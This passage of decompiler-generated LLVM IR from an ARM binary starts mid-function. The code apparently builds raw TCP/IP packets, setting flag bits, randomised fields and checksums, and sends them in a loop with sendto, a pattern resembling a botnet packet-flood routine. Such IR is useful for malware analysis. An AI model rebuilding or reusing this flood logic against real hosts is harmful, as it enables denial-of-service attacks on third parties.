  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v1_ae64 = add i32 %v0_ae58, 14
  %v2_ae64 = inttoptr i32 %v1_ae64 to i8*
  %v3_ae64 = load i8, i8* %v2_ae64, align 1
  %v4_ae64 = zext i8 %v3_ae64 to i32
  store i32 %v4_ae64, i32* %r0.global-to-local, align 4
  %v2_ae68 = add i32 %v0_ae54, 4
  %v3_ae68 = inttoptr i32 %v2_ae68 to i32*
  store i32 %v3_ae58, i32* %v3_ae68, align 4
  %v0_ae6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ae6c = add i32 %v0_ae6c, 4
  %v2_ae6c = inttoptr i32 %v1_ae6c to i32*
  %v3_ae6c = load i32, i32* %v2_ae6c, align 4
  store i32 %v3_ae6c, i32* %lr.global-to-local, align 4
  %v0_ae70 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae70 = trunc i32 %v0_ae70 to i8
  %v2_ae70 = load i32, i32* @r6, align 4
  %v3_ae70 = add i32 %v2_ae70, 13
  %v4_ae70 = inttoptr i32 %v3_ae70 to i8*
  store i8 %v1_ae70, i8* %v4_ae70, align 1
  %v0_ae74 = load i32, i32* @r6, align 4
  %v1_ae74 = add i32 %v0_ae74, 12
  %v2_ae74 = inttoptr i32 %v1_ae74 to i8*
  %v3_ae74 = load i8, i8* %v2_ae74, align 1
  %v4_ae74 = zext i8 %v3_ae74 to i32
  store i32 %v4_ae74, i32* %r2.global-to-local, align 4
  %v1_ae78 = add i32 %v0_ae74, 13
  %v2_ae78 = inttoptr i32 %v1_ae78 to i8*
  %v3_ae78 = load i8, i8* %v2_ae78, align 1
  %v4_ae78 = zext i8 %v3_ae78 to i32
  %v0_ae7c = load i32, i32* %r0.global-to-local, align 4
  %v1_ae7c = load i32, i32* %ip.global-to-local, align 4
  %v4_ae7c = mul i32 %v1_ae7c, 256
  %v5_ae7c = or i32 %v4_ae7c, %v0_ae7c
  store i32 %v5_ae7c, i32* %r0.global-to-local, align 4
  %tmp120 = urem i8 %v3_ae74, 16
  %v1_ae80 = zext i8 %tmp120 to i32
  %v3_ae84 = sdiv i32 %v5_ae7c, 256
  store i32 %v3_ae84, i32* %r1.global-to-local, align 4
  %v1_ae88 = or i32 %v1_ae80, 128
  store i32 %v1_ae88, i32* %r2.global-to-local, align 4
  %v1_ae8c = or i32 %v4_ae78, 16
  store i32 %v1_ae8c, i32* %r3.global-to-local, align 4
  %v1_ae90 = trunc i32 %v3_ae84 to i8
  %v3_ae90 = add i32 %v0_ae74, 3
  %v4_ae90 = inttoptr i32 %v3_ae90 to i8*
  store i8 %v1_ae90, i8* %v4_ae90, align 1
  %v0_ae94 = load i32, i32* %r2.global-to-local, align 4
  %v1_ae94 = trunc i32 %v0_ae94 to i8
  %v2_ae94 = load i32, i32* @r6, align 4
  %v3_ae94 = add i32 %v2_ae94, 12
  %v4_ae94 = inttoptr i32 %v3_ae94 to i8*
  store i8 %v1_ae94, i8* %v4_ae94, align 1
  %v0_ae98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ae98 = trunc i32 %v0_ae98 to i8
  %v2_ae98 = load i32, i32* @r6, align 4
  %v3_ae98 = add i32 %v2_ae98, 13
  %v4_ae98 = inttoptr i32 %v3_ae98 to i8*
  store i8 %v1_ae98, i8* %v4_ae98, align 1
  %v0_ae9c = load i32, i32* %lr.global-to-local, align 4
  %v1_ae9c = load i32, i32* @r6, align 4
  %v2_ae9c = add i32 %v1_ae9c, 8
  %v3_ae9c = inttoptr i32 %v2_ae9c to i32*
  store i32 %v0_ae9c, i32* %v3_ae9c, align 4
  %v0_aea0 = load i32, i32* %r0.global-to-local, align 4
  %v1_aea0 = trunc i32 %v0_aea0 to i8
  %v2_aea0 = load i32, i32* @r6, align 4
  %v3_aea0 = add i32 %v2_aea0, 2
  %v4_aea0 = inttoptr i32 %v3_aea0 to i8*
  store i8 %v1_aea0, i8* %v4_aea0, align 1
  %v0_aea4 = call i32 @function_f6c4()
  %v1_aea4 = trunc i32 %v0_aea4 to i8
  store i32 %v0_aea4, i32* %r0.global-to-local, align 4
  store i32 %v1_a96c, i32* %r1.global-to-local, align 4
  %v0_aeac = load i32, i32* @r6, align 4
  %v1_aeac = add i32 %v0_aeac, 13
  %v2_aeac = inttoptr i32 %v1_aeac to i8*
  %v3_aeac = load i8, i8* %v2_aeac, align 1
  %v4_aeac = zext i8 %v3_aeac to i32
  store i32 %v1_aeb0, i32* %r2.global-to-local, align 4
  %v1_aeb4 = and i32 %v4_aeac, 223
  %v5_aeb8 = or i32 %v1_aeb4, %v4_aeb8
  store i32 %v5_aeb8, i32* %r3.global-to-local, align 4
  %v1_aebc = trunc i32 %v5_aeb8 to i8
  store i8 %v1_aebc, i8* %v2_aeac, align 1
  store i32 %v1_a98c, i32* %ip.global-to-local, align 4
  %v0_aec4 = load i32, i32* @r6, align 4
  %v1_aec4 = add i32 %v0_aec4, 13
  %v2_aec4 = inttoptr i32 %v1_aec4 to i8*
  %v3_aec4 = load i8, i8* %v2_aec4, align 1
  %v4_aec4 = zext i8 %v3_aec4 to i32
  store i32 %v1_aec8, i32* %r3.global-to-local, align 4
  %v1_aecc = and i32 %v4_aec4, 239
  %v5_aed0 = or i32 %v1_aecc, %v4_aed0
  store i32 %v5_aed0, i32* %r2.global-to-local, align 4
  %v1_aed4 = trunc i32 %v5_aed0 to i8
  store i8 %v1_aed4, i8* %v2_aec4, align 1
  store i32 %v1_a9ac, i32* %r1.global-to-local, align 4
  %v0_aedc = load i32, i32* @r6, align 4
  %v1_aedc = add i32 %v0_aedc, 13
  %v2_aedc = inttoptr i32 %v1_aedc to i8*
  %v3_aedc = load i8, i8* %v2_aedc, align 1
  %v4_aedc = zext i8 %v3_aedc to i32
  store i32 %v1_aee0, i32* %r2.global-to-local, align 4
  %v1_aee4 = and i32 %v4_aedc, 247
  %v5_aee8 = or i32 %v1_aee4, %v4_aee8
  store i32 %v5_aee8, i32* %r3.global-to-local, align 4
  %v1_aeec = trunc i32 %v5_aee8 to i8
  store i8 %v1_aeec, i8* %v2_aedc, align 1
  store i32 %v1_a9cc, i32* %ip.global-to-local, align 4
  %v0_aef4 = load i32, i32* @r6, align 4
  %v1_aef4 = add i32 %v0_aef4, 13
  %v2_aef4 = inttoptr i32 %v1_aef4 to i8*
  %v3_aef4 = load i8, i8* %v2_aef4, align 1
  %v4_aef4 = zext i8 %v3_aef4 to i32
  store i32 %v1_aef8, i32* %r3.global-to-local, align 4
  %v1_aefc = and i32 %v4_aef4, 251
  %v5_af00 = or i32 %v1_aefc, %v4_af00
  store i32 %v5_af00, i32* %r2.global-to-local, align 4
  %v1_af04 = trunc i32 %v5_af00 to i8
  store i8 %v1_af04, i8* %v2_aef4, align 1
  store i32 %v1_a9ec, i32* %r1.global-to-local, align 4
  %v0_af0c = load i32, i32* @r6, align 4
  %v1_af0c = add i32 %v0_af0c, 13
  %v2_af0c = inttoptr i32 %v1_af0c to i8*
  %v3_af0c = load i8, i8* %v2_af0c, align 1
  %v4_af0c = zext i8 %v3_af0c to i32
  store i32 %v1_af10, i32* %r2.global-to-local, align 4
  %v1_af14 = and i32 %v4_af0c, 253
  %v4_af18 = or i32 %v1_af14, %v3_af18
  store i32 %v4_af18, i32* %r3.global-to-local, align 4
  %v1_af1c = trunc i32 %v4_af18 to i8
  store i8 %v1_af1c, i8* %v2_af0c, align 1
  %v0_af20 = load i32, i32* @r6, align 4
  %v1_af20 = add i32 %v0_af20, 13
  %v2_af20 = inttoptr i32 %v1_af20 to i8*
  %v3_af20 = load i8, i8* %v2_af20, align 1
  %v4_af20 = zext i8 %v3_af20 to i32
  %v0_af24 = load i32, i32* @r8, align 4
  %v1_af24 = urem i32 %v0_af24, 2
  %v1_af28 = and i32 %v4_af20, 254
  store i32 %v1_af28, i32* %r2.global-to-local, align 4
  %v4_af2c36 = udiv i32 %v0_aea4, 256
  %v2_af30 = or i32 %v1_af28, %v1_af24
  store i32 %v2_af30, i32* %r3.global-to-local, align 4
  %v1_af34 = trunc i32 %v4_af2c36 to i8
  %v3_af34 = add i32 %v0_af20, 15
  %v4_af34 = inttoptr i32 %v3_af34 to i8*
  store i8 %v1_af34, i8* %v4_af34, align 1
  %v3_af38 = load i32, i32* @r6, align 4
  %v4_af38 = add i32 %v3_af38, 14
  %v5_af38 = inttoptr i32 %v4_af38 to i8*
  store i8 %v1_aea4, i8* %v5_af38, align 1
  %v0_af3c = load i32, i32* %r3.global-to-local, align 4
  %v1_af3c = trunc i32 %v0_af3c to i8
  %v2_af3c = load i32, i32* @r6, align 4
  %v3_af3c = add i32 %v2_af3c, 13
  %v4_af3c = inttoptr i32 %v3_af3c to i8*
  store i8 %v1_af3c, i8* %v4_af3c, align 1
  %v0_af40 = load i32, i32* @r4, align 4
  %v1_af40 = add i32 %v0_af40, 40
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  %v0_af44 = load i32, i32* @sb, align 4
  store i32 %v0_af44, i32* @r1, align 4
  %v1_af48 = inttoptr i32 %v1_af40 to i8*
  %v2_af48 = call i32 @function_f844(i8* %v1_af48)
  store i32 %v2_af48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af4c

dec_label_pc_af4c:                                ; preds = %dec_label_pc_aac0, %dec_label_pc_accc, %bb96
  %v3_af4c = load i32, i32* %stack_var_-40, align 4
  %v1_af50 = add i32 %v3_af4c, 1
  store i32 %v1_af50, i32* %r3.global-to-local, align 4
  %v1_af54 = load i32, i32* @fp, align 4
  %v9_af54 = icmp eq i32 %v1_af50, %v1_af54
  store i1 %v9_af54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af50, i32* %stack_var_-40, align 4
  %v5_af5c = icmp slt i32 %v1_af50, %v1_af54
  br i1 %v5_af5c, label %dec_label_pc_aac0, label %dec_label_pc_af60

dec_label_pc_af60:                                ; preds = %dec_label_pc_af4c, %.thread26
  %v0_af6820 = phi i32 [ %v0_aa94, %.thread26 ], [ %v1_af54, %dec_label_pc_af4c ]
  %v0_af60 = load i32, i32* @sb, align 4
  %v1_af60 = add i32 %v0_af60, 40
  store i32 %v1_af60, i32* @sl, align 4
  %v1_af64 = add i32 %v0_af60, 20
  store i32 %v1_af64, i32* @r7, align 4
  %v2_b0e0 = icmp eq i32 %v1_aa44, 0
  %v3_af9c = icmp eq i32 %v3_aa9c, 65535
  br label %dec_label_pc_af68

dec_label_pc_af68:                                ; preds = %dec_label_pc_afc4, %dec_label_pc_af60
  %v0_af68 = phi i32 [ %v1_b0a4, %dec_label_pc_afc4 ], [ %v0_af6820, %dec_label_pc_af60 ]
  %v2_af68 = icmp eq i32 %v0_af68, 0
  store i1 %v2_af68, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_af68, 1
  br label %dec_label_pc_af70

dec_label_pc_af70:                                ; preds = %dec_label_pc_af70, %dec_label_pc_af68
  br i1 %tmp97, label %dec_label_pc_af70, label %dec_label_pc_af74

dec_label_pc_af74:                                ; preds = %dec_label_pc_af70
  %v0_af74 = load i32, i32* @r7, align 4
  %tmp98 = mul i32 %v0_af74, 256
  %v1_af7c = and i32 %tmp98, 65280
  %tmp99 = udiv i32 %v0_af74, 256
  %v4_af80 = urem i32 %tmp99, 256
  %v5_af80 = or i32 %v4_af80, %v1_af7c
  store i32 %v5_af80, i32* @r8, align 4
  store i32 %v4_a8b4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_aa9c, i32* %ip.global-to-local, align 4
  %v7_af94 = load i32, i32* %v2_a8b4, align 4
  store i32 %v7_af94, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_af9c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_afa8 = add i32 %v7_af94, 20
  store i32 %v1_afa8, i32* @r5, align 4
  br i1 %v3_af9c, label %dec_label_pc_b0d0, label %dec_label_pc_afb0

dec_label_pc_afb0:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_af74
  %v0_afbc = phi i32 [ %v7_b0bc, %dec_label_pc_b0b0 ], [ %v7_af94, %dec_label_pc_af74 ]
  store i1 %v2_b0e0, i1* %cpsr_z.global-to-local, align 1
  %v0_afb8 = load i32, i32* @sb, align 4
  store i32 %v0_afb8, i32* @r1, align 4
  %v1_afbc = add i32 %v0_afbc, 40
  store i32 %v1_afbc, i32* %r0.global-to-local, align 4
  br i1 %v2_b0e0, label %dec_label_pc_afc4, label %dec_label_pc_b0f4

dec_label_pc_afc4:                                ; preds = %dec_label_pc_afb0, %dec_label_pc_b0d0, %dec_label_pc_b0f4
  %v2_afc4 = phi i32 [ %v0_afbc, %dec_label_pc_afb0 ], [ %v0_b0e8, %dec_label_pc_b0d0 ], [ %v2_afc4.pre, %dec_label_pc_b0f4 ]
  %v0_afc4 = load i32, i32* @r6, align 4
  %v1_afc4 = trunc i32 %v0_afc4 to i8
  %v3_afc4 = add i32 %v2_afc4, 10
  %v4_afc4 = inttoptr i32 %v3_afc4 to i8*
  store i8 %v1_afc4, i8* %v4_afc4, align 1
  %v0_afc8 = load i32, i32* @r6, align 4
  %v1_afc8 = trunc i32 %v0_afc8 to i8
  %v2_afc8 = load i32, i32* @r4, align 4
  %v3_afc8 = add i32 %v2_afc8, 11
  %v4_afc8 = inttoptr i32 %v3_afc8 to i8*
  store i8 %v1_afc8, i8* %v4_afc8, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_afd0 = load i32, i32* @r4, align 4
  store i32 %v0_afd0, i32* @r0, align 4
  %v2_afd4 = call i32 @function_de24(i32 %v0_afd0, i32 20)
  %v3_afd4 = trunc i32 %v2_afd4 to i8
  store i32 %v2_afd4, i32* %r0.global-to-local, align 4
  %v3_afd8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_a8a4, i32* %r2.global-to-local, align 4
  %v3_afe0 = mul i32 %v3_afd8, 16
  %v2_afe4 = add i32 %v3_afe0, %v4_a8a4
  store i32 %v2_afe4, i32* %r1.global-to-local, align 4
  %v1_afe8 = add i32 %v2_afe4, 4
  %v2_afe8 = inttoptr i32 %v1_afe8 to i32*
  %v3_afe8 = load i32, i32* %v2_afe8, align 4
  %v3_afec = mul i32 %v3_afe8, 65536
  store i32 %v3_afec, i32* %ip.global-to-local, align 4
  %tmp100 = mul i32 %v3_afe8, 256
  %v1_aff4 = and i32 %tmp100, 65280
  %tmp101 = udiv i32 %v3_afe8, 256
  %v4_aff8 = urem i32 %tmp101, 256
  %v5_aff8 = or i32 %v4_aff8, %v1_aff4
  store i32 %v5_aff8, i32* %r2.global-to-local, align 4
  %v1_affc = add i32 %v3_afe8, 1
  store i32 %v1_affc, i32* %r3.global-to-local, align 4
  store i32 %v1_affc, i32* %v2_afe8, align 4
  %v0_b004 = load i32, i32* %r2.global-to-local, align 4
  %v1_b004 = load i32, i32* @r5, align 4
  %v2_b004 = add i32 %v1_b004, 4
  %v3_b004 = inttoptr i32 %v2_b004 to i32*
  store i32 %v0_b004, i32* %v3_b004, align 4
  %v0_b008 = load i32, i32* %r1.global-to-local, align 4
  %v1_b008 = add i32 %v0_b008, 8
  %v2_b008 = inttoptr i32 %v1_b008 to i32*
  %v3_b008 = load i32, i32* %v2_b008, align 4
  %tmp102 = mul i32 %v3_b008, 256
  %v1_b014 = and i32 %tmp102, 65280
  %tmp103 = udiv i32 %v3_b008, 256
  %v4_b018 = urem i32 %tmp103, 256
  %v5_b018 = or i32 %v4_b018, %v1_b014
  store i32 %v5_b018, i32* %r2.global-to-local, align 4
  %v4_b01c37 = udiv i32 %v2_afd4, 256
  %v1_b020 = trunc i32 %v4_b01c37 to i8
  %v2_b020 = load i32, i32* @r4, align 4
  %v3_b020 = add i32 %v2_b020, 11
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v3_b024 = load i32, i32* @r4, align 4
  %v4_b024 = add i32 %v3_b024, 10
  %v5_b024 = inttoptr i32 %v4_b024 to i8*
  store i8 %v3_afd4, i8* %v5_b024, align 1
  %v0_b028 = load i32, i32* %r2.global-to-local, align 4
  %v1_b028 = load i32, i32* @r5, align 4
  %v2_b028 = add i32 %v1_b028, 8
  %v3_b028 = inttoptr i32 %v2_b028 to i32*
  store i32 %v0_b028, i32* %v3_b028, align 4
  %v0_b02c = load i32, i32* @r5, align 4
  store i32 %v0_b02c, i32* @r1, align 4
  %v0_b030 = load i32, i32* @r8, align 4
  store i32 %v0_b030, i32* %r2.global-to-local, align 4
  %v0_b034 = load i32, i32* @r7, align 4
  store i32 %v0_b034, i32* %r3.global-to-local, align 4
  %v0_b038 = load i32, i32* @r4, align 4
  store i32 %v0_b038, i32* %r0.global-to-local, align 4
  %v0_b03c = load i32, i32* @r6, align 4
  %v1_b03c = trunc i32 %v0_b03c to i8
  %v3_b03c = add i32 %v0_b02c, 16
  %v4_b03c = inttoptr i32 %v3_b03c to i8*
  store i8 %v1_b03c, i8* %v4_b03c, align 1
  %v0_b040 = load i32, i32* @r6, align 4
  %v1_b040 = trunc i32 %v0_b040 to i8
  %v2_b040 = load i32, i32* @r5, align 4
  %v3_b040 = add i32 %v2_b040, 17
  %v4_b040 = inttoptr i32 %v3_b040 to i8*
  store i8 %v1_b040, i8* %v4_b040, align 1
  %v4_b044 = call i32 @function_de80(i32 %v0_b038, i32 %v0_b02c, i32 %v0_b030, i32 %v0_b034)
  %v5_b044 = trunc i32 %v4_b044 to i8
  store i32 %v4_b044, i32* %r0.global-to-local, align 4
  %v4_b04838 = udiv i32 %v4_b044, 256
  %v1_b04c = trunc i32 %v4_b04838 to i8
  %v2_b04c = load i32, i32* @r5, align 4
  %v3_b04c = add i32 %v2_b04c, 17
  %v4_b04c = inttoptr i32 %v3_b04c to i8*
  store i8 %v1_b04c, i8* %v4_b04c, align 1
  %v3_b050 = load i32, i32* @r5, align 4
  %v4_b050 = add i32 %v3_b050, 16
  %v5_b050 = inttoptr i32 %v4_b050 to i8*
  store i8 %v5_b044, i8* %v5_b050, align 1
  %v3_b054 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b054, i32* %r3.global-to-local, align 4
  %v0_b058 = load i32, i32* @r4, align 4
  %v1_b058 = add i32 %v0_b058, 20
  %v2_b058 = inttoptr i32 %v1_b058 to i32*
  %v3_b058 = load i32, i32* %v2_b058, align 4
  %v5_b060 = mul i32 %v3_b054, 24
  %v3_b068 = udiv i32 %v3_b058, 65536
  store i32 %v3_b068, i32* %r2.global-to-local, align 4
  %v2_b06c = add i32 %v5_b060, %arg2
  store i32 %v2_b06c, i32* %ip.global-to-local, align 4
  %v3_b0707 = udiv i32 %v3_b058, 16777216
  %v1_b074 = trunc i32 %v3_b0707 to i8
  %v3_b074 = add i32 %v2_b06c, 3
  %v4_b074 = inttoptr i32 %v3_b074 to i8*
  store i8 %v1_b074, i8* %v4_b074, align 1
  %v0_b078 = load i32, i32* %r2.global-to-local, align 4
  %v1_b078 = trunc i32 %v0_b078 to i8
  %v2_b078 = load i32, i32* %ip.global-to-local, align 4
  %v3_b078 = add i32 %v2_b078, 2
  %v4_b078 = inttoptr i32 %v3_b078 to i8*
  store i8 %v1_b078, i8* %v4_b078, align 1
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_aa54, i32* %r0.global-to-local, align 4
  %v0_b088 = load i32, i32* @sl, align 4
  store i32 %v0_b088, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v4_b090 = inttoptr i32 %v0_b090 to %sockaddr*
  %v7_b098 = inttoptr i32 %v0_b07c to i32*
  %v9_b098 = call i32 @sendto(i32 %v3_aa54, i32* %v7_b098, i32 %v0_b088, i32 16384, %sockaddr* %v4_b090, i32 16)
  %v3_b09c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b09c, i32* %r3.global-to-local, align 4
  %v1_b0a0 = add i32 %v3_b09c, 1
  store i32 %v1_b0a0, i32* %r0.global-to-local, align 4
  %v1_b0a4 = load i32, i32* @fp, align 4
  %v9_b0a4 = icmp eq i32 %v1_b0a0, %v1_b0a4
  store i1 %v9_b0a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b0a0, i32* %stack_var_-40, align 4
  %v6_b0ac = icmp slt i32 %v1_b0a0, %v1_b0a4
  br i1 %v6_b0ac, label %dec_label_pc_b0b0, label %dec_label_pc_af68

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_afc4
  store i32 %v4_a8b4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_aa9c, i32* %ip.global-to-local, align 4
  %v4_b0bc = mul i32 %v1_b0a0, 4
  %v5_b0bc = add i32 %v4_b0bc, %v4_a8b4
  %v6_b0bc = inttoptr i32 %v5_b0bc to i32*
  %v7_b0bc = load i32, i32* %v6_b0bc, align 4
  store i32 %v7_b0bc, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_af9c, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c8 = add i32 %v7_b0bc, 20
  store i32 %v1_b0c8, i32* @r5, align 4
  br i1 %v3_af9c, label %dec_label_pc_b0d0, label %dec_label_pc_afb0

dec_label_pc_b0d0:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_af74
  %v0_b0d0 = call i32 @function_f6c4()
  %v1_b0d0 = trunc i32 %v0_b0d0 to i8
  %v4_b0d4 = sdiv i32 %v0_b0d0, 256
  store i32 %v4_b0d4, i32* %r3.global-to-local, align 4
  %v3_b0d8 = load i32, i32* @r4, align 4
  %v4_b0d8 = add i32 %v3_b0d8, 4
  %v5_b0d8 = inttoptr i32 %v4_b0d8 to i8*
  store i8 %v1_b0d0, i8* %v5_b0d8, align 1
  store i1 %v2_b0e0, i1* %cpsr_z.global-to-local, align 1
  %v0_b0e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0e4 = trunc i32 %v0_b0e4 to i8
  %v2_b0e4 = load i32, i32* @r4, align 4
  %v3_b0e4 = add i32 %v2_b0e4, 5
  %v4_b0e4 = inttoptr i32 %v3_b0e4 to i8*
  store i8 %v1_b0e4, i8* %v4_b0e4, align 1
  %v0_b0e8 = load i32, i32* @r4, align 4
  %v1_b0e8 = add i32 %v0_b0e8, 40
  store i32 %v1_b0e8, i32* %r0.global-to-local, align 4
  %v0_b0ec = load i32, i32* @sb, align 4
  store i32 %v0_b0ec, i32* @r1, align 4
  %v0_b0f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0f0, label %dec_label_pc_afc4, label %dec_label_pc_b0f4

dec_label_pc_b0f4:                                ; preds = %dec_label_pc_afb0, %dec_label_pc_b0d0
  %v0_b0f4 = phi i32 [ %v1_afbc, %dec_label_pc_afb0 ], [ %v1_b0e8, %dec_label_pc_b0d0 ]
  %v1_b0f4 = inttoptr i32 %v0_b0f4 to i8*
  %v2_b0f4 = call i32 @function_f844(i8* %v1_b0f4)
  store i32 %v2_b0f4, i32* %r0.global-to-local, align 4
  %v2_afc4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_afc4

; uselistorder directives
  uselistorder i32 %v0_b0e8, { 1, 0 }
  uselistorder i32 %v7_b0bc, { 1, 2, 0 }
  uselistorder i32 %v1_b0a4, { 1, 2, 0 }
  uselistorder i32 %v1_b0a0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_b044, { 0, 2, 1 }
  uselistorder i32 %v0_b02c, { 1, 0, 2 }
  uselistorder i32 %v3_b008, { 1, 0 }
  uselistorder i32 %v3_afe8, { 3, 2, 0, 1 }
  uselistorder i32 %v2_afd4, { 0, 2, 1 }
  uselistorder i32 %v0_afbc, { 1, 0 }
  uselistorder i32 %v0_af74, { 1, 0 }
  uselistorder i32 %v0_af68, { 1, 0 }
  uselistorder i1 %v3_af9c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b0e0, { 2, 1, 0 }
  uselistorder i32 %v1_af50, { 1, 0, 2, 3 }
  uselistorder i32 %v0_aea4, { 0, 2, 1 }
  uselistorder i32 %v3_ae84, { 1, 0 }
  uselistorder i32 %v0_ae58, { 1, 0, 2 }
  uselistorder i32 %v3_ae4c, { 1, 0 }
  uselistorder i32 %v1_adb0, { 1, 0 }
  uselistorder i32 %v0_ada4, { 1, 2, 0 }
  uselistorder i32 %v3_ad68, { 1, 0 }
  uselistorder i32 %v2_ad54, { 1, 0 }
  uselistorder i32 %v3_ad38, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ad30, { 1, 0 }
  uselistorder i32 %v3_ad0c, { 1, 0, 2 }
  uselistorder i32 %v3_ad04, { 1, 0 }
  uselistorder i32 %v4_acec, { 1, 0 }
  uselistorder i32 %v0_ace8, { 0, 2, 1 }
  uselistorder i32 %v3_aae8, { 1, 2, 3, 0 }
  uselistorder i32 %v5_ac9c, { 1, 0 }
  uselistorder i1 %v9_ac80, { 1, 0 }
  uselistorder i32 %v4_ac94, { 1, 0 }
  uselistorder i32 %v4_ac90, { 1, 0 }
  uselistorder i32 %storemerge34, { 0, 2, 1 }
  uselistorder i32 %v8_ab88, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ab74, { 1, 0 }
  uselistorder i32 %v7_ab40, { 4, 1, 3, 0, 2, 5 }
  uselistorder i32 %v1_af10, { 1, 0 }
  uselistorder i32 %v1_aef8, { 1, 0 }
  uselistorder i32 %v1_aee0, { 1, 0 }
  uselistorder i32 %v1_aec8, { 1, 0 }
  uselistorder i32 %v1_aeb0, { 1, 0 }
  uselistorder i32 %v5_ac98, { 1, 0 }
  uselistorder i32 %v3_abd0112, { 1, 0 }
  uselistorder i1 %v2_acb0, { 1, 0 }
  uselistorder i32 %v1_acac, { 1, 0 }
  uselistorder i32 %v4_aca8, { 2, 0, 1 }
  uselistorder i32 %v4_ac8c, { 1, 0 }
  uselistorder i1 %v3_abb8, { 1, 0 }
  uselistorder i32 %v1_aacc, { 2, 1, 0 }
  uselistorder i32 %v8_aaa8, { 2, 1, 0 }
  uselistorder i32 %v8_aaa4, { 1, 2, 0 }
  uselistorder i32 %v3_aa9c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_aa98, { 1, 0, 3, 2 }
  uselistorder i32 %v3_aa58, { 2, 3, 0, 1 }
  uselistorder i32 %v3_aa54, { 3, 4, 1, 2, 5, 6, 0, 7, 8 }
  uselistorder i32 %v1_aa44, { 1, 0 }
  uselistorder i32 %v1_a9ec, { 1, 2, 0 }
  uselistorder i32 %v1_a9cc, { 1, 2, 0 }
  uselistorder i32 %v1_a9ac, { 1, 2, 0 }
  uselistorder i32 %v1_a98c, { 1, 2, 0 }
  uselistorder i32 %v1_a96c, { 1, 2, 0 }
  uselistorder i32 %v1_a934, { 1, 2, 0 }
  uselistorder i32 %v5_a8f0, { 0, 2, 1 }
  uselistorder i32 %v4_a8b4, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v4_a8a4, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_a888, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 50, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 0, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 20, 21, 27, 22, 23, 24, 25, 26, 28, 29, 30, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 50 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 7, 6, 11, 8, 9, 12, 10, 21, 13, 14, 15, 16, 17, 18, 19, 20, 25, 22, 23, 24, 26, 28, 27, 46, 43, 29, 32, 30, 33, 34, 31, 36, 35, 37, 38, 39, 41, 40, 42, 1, 0, 44, 45, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 24, 15, 16, 17, 19, 0, 20, 21, 18, 22, 23, 1, 25, 26, 27 }
  uselistorder label %dec_label_pc_b0f4, { 1, 0 }
  uselistorder label %dec_label_pc_afc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_af4c, { 2, 1, 0 }
  uselistorder label %bb96, { 1, 0 }
